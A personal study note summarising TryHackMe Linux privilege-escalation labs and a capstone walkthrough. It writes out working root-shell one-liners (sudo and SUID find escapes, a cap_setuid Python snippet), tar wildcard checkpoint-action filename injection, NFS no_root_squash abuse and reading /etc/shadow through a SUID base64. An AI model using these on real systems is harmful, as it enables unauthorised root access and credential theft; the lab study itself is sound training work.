# THM PrivEsc Summary

This note summarizes key privilege escalation concepts and attack patterns from TryHackMe PrivEsc labs.
Focus: attacker reasoning, fast exploit identification, and real exploitation paths.

---

## 🧠 Core Mindset

Privilege escalation is **NOT about commands**.

It is about:

```text
CONTROL + POWER + EXECUTION = EXPLOIT
```

---

## 🔥 Core Attacker Questions

* What can I control?
* What privilege is this running with?
* How does execution happen?
* Can I turn this into code execution?

---

## ⚔️ Enumeration Framework

### 🧍 Identity & Context

```bash
id
whoami
pwd
```

Goal: understand current privilege and position.

---

### 🖥️ System Enumeration

```bash
hostname
uname -a
cat /proc/version
cat /etc/os-release
```

Goal: identify OS, kernel, and attack surface.

---

### ⚠️ CVE Insight

* Old kernel ≠ exploitable
* Must check:

  * environment requirements
  * vulnerable component
  * exploit conditions

---

### ⚙️ Tool Availability

```bash
gcc --version
python3 --version
```

Goal: check if exploit execution is possible.

---

## ⚔️ Common PrivEsc Vectors

---

### 🔥 SUDO Abuse

```bash
sudo -l
```

**Model:**

```text
CONTROL = allowed command  
POWER = root  
EXECUTION = command capability  
```

**Example:**

```bash
sudo find . -exec /bin/sh \; -quit
```

**Takeaway:**

If a powerful binary is allowed → immediate privilege escalation.

---

### 🔥 SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Model:**

```text
CONTROL = input  
POWER = root (SUID)  
EXECUTION = binary behavior  
```

**Example:**

```bash
find . -exec /bin/sh \;
```

**Takeaway:**

SUID + execution capability = privilege escalation.

---

### 🔥 Linux Capabilities

```bash
getcap -r / 2>/dev/null
```

**Model:**

```text
CONTROL = executable  
POWER = capability (e.g. cap_setuid)  
EXECUTION = code execution  
```

**Example:**

```python
import os
os.setuid(0)
os.system("/bin/sh")
```

**Takeaway:**

`cap_setuid` can directly lead to root if execution is possible.

---

## ⚔️ Automation & Execution Abuse

---

### 🔥 Cron Jobs

```bash
ls -la /etc/cron*
cat /etc/crontab
```

**Model:**

```text
CONTROL = writable script  
POWER = root  
EXECUTION = scheduled execution  
```

**Takeaway:**

Anything auto-executed by root = high value target.

---

### 🔥 PATH Hijacking

```bash
echo $PATH
```

**Model:**

```text
CONTROL = writable PATH directory  
POWER = privileged execution  
EXECUTION = command resolution  
```

**Mechanism:**

Fake binary placed earlier in PATH → executed instead of real one.

**Takeaway:**

Non-absolute commands + writable PATH = exploitable.

---

### 🔥 Wildcard Injection

**Scenario:**

```bash
tar -cf backup.tar *
```

**Model:**

```text
CONTROL = filenames  
POWER = root execution  
EXECUTION = wildcard expansion  
```

**Exploit:**

```text
--checkpoint=1
--checkpoint-action=exec=/bin/sh
```

**Takeaway:**

Wildcard expansion can convert filenames into command execution.

---

## ⚔️ Filesystem Abuse

---

### 🔥 Writable Locations

```bash
find / -writable 2>/dev/null
```

**Insight:**

Writable = attacker control surface.

---

### 🔥 Key Concept

```text
Listing ≠ Reading
```

Example:

* Cannot `ls /root`
* But may still `cat /root/file` if permissions allow

---

## ⚔️ NFS Exploitation

---

### 🔥 Core Idea

Mounting allows interaction with remote filesystem locally.

---

### 🔥 Vulnerability

```text
no_root_squash
```

Meaning:

```text
Attacker root = target root
```

---

### ⚔️ Attack Flow

```bash
mount TARGET:/share /mnt
```

```bash
# create malicious file
chmod +s file
```

Execute → gain root.

---

### 🎯 Takeaway

Mounting changes **where actions apply**, not copying files.

---

## ⚔️ File Discovery Without Listing

---

### Techniques

* Guess common filenames (id_rsa, flag.txt)
* Check logs and scripts
* Infer directory purpose
* Abuse permission mismatches

---

## ⚔️ Capstone Flow

---

### Step 1 — Enumeration

```bash
sudo -l
```

→ nothing useful

---

### Step 2 — SUID Discovery

```bash
find / -perm -4000
```

→ found `base64`

---

### Step 3 — Abuse

Read sensitive files:

```bash
base64 /etc/shadow
```

---

### ❌ Mistake

* Spent time manually cracking passwords

---

### ✅ Lesson

* Do NOT commit early to slow paths

---

### Step 4 — Horizontal Movement

User → another user (e.g. leonard → missy)

---

### Step 5 — Final Escalation

```bash
sudo find . -exec /bin/sh \; -quit
```

---

### 🎯 Result

Root shell obtained.

---

## ❌ Mistakes I Made

* Overcommitted to slow paths (manual cracking)
* Didn’t prioritize fastest exploit path
* Hesitated during decision-making

---

## ✅ Key Lessons

* PrivEsc = CONTROL + POWER + EXECUTION
* Always choose fastest viable path
* Enumeration must lead to exploit hypotheses, not command dumping
* Focus on execution paths, not just “interesting findings”

---
